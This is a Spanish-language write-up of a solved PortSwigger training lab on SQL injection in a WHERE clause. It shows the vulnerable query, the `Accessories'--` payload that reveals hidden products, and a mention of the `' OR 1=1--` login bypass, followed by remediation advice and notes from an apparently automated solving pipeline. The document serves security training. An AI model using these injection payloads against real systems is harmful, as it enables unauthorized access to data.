# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data — SQL injection

## Info
- **ID**: `sqli-01`
- **Dificultad**: Apprentice
- **URL**: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
- **Instancia**: `https://0a43000904dc825588d0c94a00be0054.web-security-academy.net`
- **Fecha**: 2026-08-10 (re-ejecutado con evidencia real)
- **Estado**: SOLVED (banner verificado)
- **Nodo atacante**: GEEKOM (100.123.17.12) — payload vía `solve-lab.py`
- **Verificación**: curl desde Air

## Objetivo
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Vulnerabilidad
La query de filtrado por categoría no parametriza el input:

```sql
SELECT * FROM products WHERE category = '<INPUT>' AND released = 1
```

Al cerrar la comilla y comentar el resto, se elimina el filtro `released = 1`
y la query devuelve **todas** las filas, incluidas las ocultas (no publicadas).

## Explotación
Payload:

```
/filter?category=Accessories'--
```

Resultado SQL:
```sql
SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1
```

Respuesta verificada (productos ocultos revelados):
```
Cheshire Cat Grin
ZZZZZZ Bed - Your New Home Office
Giant Pillow Thing
Six Pack Beer Belt
```

Banner oficial: `Congratulations, you solved the lab!`

## Evidencia
- `evidence/sqli-01/request-01.txt` — payload + productos ocultos + banner
- Nodo atacante GEEKOM; verificación curl Air; instancia ephemeral

## Impacto
- **Confidencialidad**: productos/entidades no publicadas (datos ocultos) accesibles
- Base para ataques mayores: la misma clase de bug en queries autenticadas
  puede exponer datos de otros usuarios (IDOR por SQLi), bypass de auth
  (`' OR 1=1--` en login), o evolucionar a UNION-based exfiltración.

## Remediation
- **Prepared statements / parameterized queries** (la única defensa real)
- Nunca concatenar input del usuario en SQL
- Validación de input como capa adicional, no como reemplazo
- Principio de menor privilegio en la cuenta de DB de la app

## Lección aprendida
- El solver automático funciona: payload correcto → solve. El detector de banner
  del script no vio el solve en la misma request (PortSwigger confirma en la
  siguiente navegación) — el probe posterior con curl confirmó.
- **Regla del pipeline**: verificar con request independiente tras el exploit;
  el banner es el único signal honesto de solve.
